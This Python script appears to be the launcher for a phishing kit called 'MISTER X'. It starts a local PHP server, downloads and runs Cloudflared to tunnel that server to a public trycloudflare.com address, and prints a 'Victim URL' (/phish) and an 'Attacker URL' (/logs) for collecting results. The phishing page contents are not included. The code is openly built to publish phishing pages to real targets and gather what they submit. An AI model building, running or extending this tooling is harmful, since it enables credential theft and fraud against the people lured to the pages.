import os
import json
import subprocess
import platform
import shutil

CONFIG_FILE = "config.json"

# ASCII Art Banner
def display_banner():
    print("\033[1;93m      _______        \033[0m")
    print("\033[1;93m     /       \\\\      \033[0m")
    print("\033[1;93m    /  _____  \\\\     \033[0m")
    print("\033[1;92m   |  |     |  |     \033[0m")
    print("\033[1;92m   |  | o o |  |     \033[0m")
    print("\033[1;92m   |  |  ^  |  |     \033[0m")
    print("\033[1;92m   |  | '-' |  |     \033[0m")
    print("\033[1;97m    \\  \\___/  /      \033[0m")
    print("\033[1;97m     \\_______/       \033[0m")
    print("\033[1;96m     / ||||| \\       \033[0m")
    print("\033[1;96m    /  |||||  \\      \033[0m")
    print("\033[1;96m   |___|||||___|     \033[0m")
    print("\033[1;94m    [ MISTER X ]      \033[0m\n")

# Load or initialize the configuration file
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as file:
            return json.load(file)
    else:
        return {"localxpose_token": "", "port": "8080"}

# Save configuration to file
def save_config(config):
    with open(CONFIG_FILE, "w") as file:
        json.dump(config, file, indent=4)

# Check and install dependencies
def check_dependencies():
    print("[*] Checking dependencies...")
    required_tools = ["php", "curl"]
    for tool in required_tools:
        if not shutil.which(tool):
            print(f"[!] Missing dependency: {tool}. Please install it and try again.")
            exit(1)
    print("[*] All dependencies are installed.")

# Install Cloudflared
def install_cloudflared():
    print("[*] Installing Cloudflared...")
    if not os.path.exists(".server"):
        os.makedirs(".server")

    arch = platform.machine()
    if arch == "x86_64":
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    elif "arm" in arch:
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
    else:
        print("[!] Unsupported architecture.")
        return

    cloudflared_path = ".server/cloudflared"
    subprocess.run(["curl", "-s", "-L", "-o", cloudflared_path, url], check=True)
    os.chmod(cloudflared_path, 0o755)

    if not os.path.exists(cloudflared_path):
        print("[!] Cloudflared installation failed. Please check your connection or try again.")
        exit(1)

    print("[*] Cloudflared installed successfully.")

# Start Cloudflared and parse the tunnel URL
def start_cloudflared(port):
    cloudflared_path = ".server/cloudflared"
    if not os.path.exists(cloudflared_path):
        print("[!] Cloudflared binary is missing. Attempting to reinstall...")
        install_cloudflared()

    print("[*] Starting Cloudflared...")
    tunnel_url = None
    try:
        process = subprocess.Popen(
            [cloudflared_path, "tunnel", "--url", f"http://127.0.0.1:{port}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        for line in process.stdout:
            print(f"[Cloudflared Log] {line.strip()}")  # Log each line for debugging
            if "trycloudflare.com" in line:
                tunnel_url = line.split(" ")[-1].strip()
                break
        else:
            print("[!] Tunnel URL not found. Falling back to manual URL creation.")
            stderr_output = process.stderr.read()
            print(f"[Cloudflared Error Log] {stderr_output.strip()}")

    except Exception as e:
        print(f"[!] An error occurred while starting Cloudflared: {e}")

    return tunnel_url

# Generate URLs for Victim and Attacker
def generate_urls(port):
    base_url = f"http://127.0.0.1:{port}"
    victim_url = f"{base_url}/phish"  # Example victim URL
    attacker_url = f"{base_url}/logs"  # Example attacker URL
    return victim_url, attacker_url

# Start a PHP server
def start_php_server(port):
    print(f"[*] Starting PHP server on port {port}...")
    os.chdir(".server/www")
    subprocess.Popen(["php", "-S", f"127.0.0.1:{port}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    os.chdir("../..")

# Main menu
def main_menu():
    config = load_config()
    port = config.get("port", "8080")
    print("[*] Select an option:")
    print("[1] Localhost")
    print("[2] Cloudflared")
    print("[3] LocalXpose")
    choice = input("Enter your choice: ").strip()

    if choice == "1":
        start_php_server(port)
        victim_url, attacker_url = generate_urls(port)
        print(f"[+] Victim URL: {victim_url}")
        print(f"[+] Attacker URL: {attacker_url}")
    elif choice == "2":
        start_php_server(port)
        tunnel_url = start_cloudflared(port)
        if tunnel_url:
            print(f"[+] Victim Tunnel URL: {tunnel_url}")
            print(f"[+] Attacker Tunnel URL: {tunnel_url}/logs")
        else:
            print("[!] Unable to create Cloudflared tunnel.")
    elif choice == "3":
        start_php_server(port)
        print("[*] LocalXpose functionality not yet implemented.")
    else:
        print("[!] Invalid choice. Exiting.")

if __name__ == "__main__":
    display_banner()  # Call the banner function
    if not os.path.exists(".server/www"):
        os.makedirs(".server/www")
    check_dependencies()
    main_menu()
